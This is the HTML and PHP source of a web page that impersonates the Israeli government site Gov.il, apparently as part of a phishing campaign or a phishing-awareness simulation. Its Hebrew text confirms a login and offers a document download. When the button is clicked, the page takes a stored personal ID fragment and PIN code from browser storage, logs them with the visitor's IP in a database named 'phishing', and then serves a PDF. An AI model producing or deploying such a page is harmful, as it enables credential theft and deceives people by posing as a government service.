<!DOCTYPE html>
<html lang="en">
<head>
<title>Gov.il</title>

<link href="css/success.css" rel="stylesheet" media="all">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">
</head>

<body dir="rtl">

<div class="main-div">
<h1 style="padding: 10px; text-align: right">כניסתך עודכנה במערכת!</h1>

<h2 style="padding: 10px; text-align: right">פרטים בהמשך....</h2>

<form id="frm" method="POST">
	<input type="hidden" id="link" name="link" value="">
	<input type="hidden" id="id" name="id" value="">
	<input type="hidden" id="code" name="code" value="">
</form>


<div class="page-wrapper bg-blue p-t-100 p-b-100 font-robo">
    <div class="wrapper wrapper--w680">
            <div class="card card-1">
                <div class="card-heading"></div>
                <div class="card-body">
				<button type="button" class="btn btn-link" onclick="linkPressed()" style="font-size: 30px;">לחץ כאן להורדת מסמך עם פרטים נוספים</button>
                </div>
            </div>
        </div>
    </div>
</div>

<script>

function linkPressed()
{
	document.getElementById("link").value = "pressed";
	
	var trimmed_id = localStorage.getItem("id");
	trimmed_id = trimmed_id.substr(trimmed_id.length-4, 4);
	
	document.getElementById("id").value = trimmed_id;
	document.getElementById("code").value = localStorage.getItem("code");
	
	document.getElementById("frm").submit();
}

</script>


<?php
	
	require_once("x509.php");
	
	$filename = "file.pdf";
	
	function get_client_ip()
	{
		  $ipaddress = '';
		  
		  if (getenv('HTTP_CLIENT_IP'))
			  $ipaddress = getenv('HTTP_CLIENT_IP');
		  else if(getenv('HTTP_X_FORWARDED_FOR'))
			  $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		  else if(getenv('HTTP_X_FORWARDED'))
			  $ipaddress = getenv('HTTP_X_FORWARDED');
		  else if(getenv('HTTP_FORWARDED_FOR'))
			  $ipaddress = getenv('HTTP_FORWARDED_FOR');
		  else if(getenv('HTTP_FORWARDED'))
			  $ipaddress = getenv('HTTP_FORWARDED');
		  else if(getenv('REMOTE_ADDR'))
			  $ipaddress = getenv('REMOTE_ADDR');
		  else
			  $ipaddress = 'UNKNOWN';

		  return $ipaddress;
	}
	
	$conn = new mysqli ('localhost','root', '', 'phishing') or die("unable to connect");	
	mysqli_set_charset($conn, "utf8");
	
	$date = date("Y-m-d H:i:s");
	
	if(!empty($_POST['link']))
	{
		$ip = get_client_ip();
		
		$operation = 'link pressed';
		
		$enc_code = encrypt_RSA($GLOBALS["KEY"], $_POST['code']);
		
		$sql = $conn->prepare("INSERT INTO users (date, ip, operation, personal_id, pin_code) VALUES (?, ?, ?, ?, ?)");
		
		$sql->bind_param('sssss', $date, $ip, $operation, $_POST['id'], $enc_code);
		
		if (!$sql->execute())
		{
				echo 'אירעה שגיאה, אנא פנה למנהל המערכת.';
		}
		
		if(file_exists($filename)) {
			//Define header information
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header("Cache-Control: no-cache, must-revalidate");
			header("Expires: 0");
			header('Content-Disposition: attachment; filename="'.basename($filename).'"');
			header('Content-Length: ' . filesize($filename));
			header('Pragma: public');
			
			ob_clean();
			//Clear system output buffer
			flush();

			//Read the size of the file
			readfile($filename);

			//Terminate from the script
			die();
		}
		else
		{
			echo "File does not exist.";
		}
	}
	
?>

</body>
</html>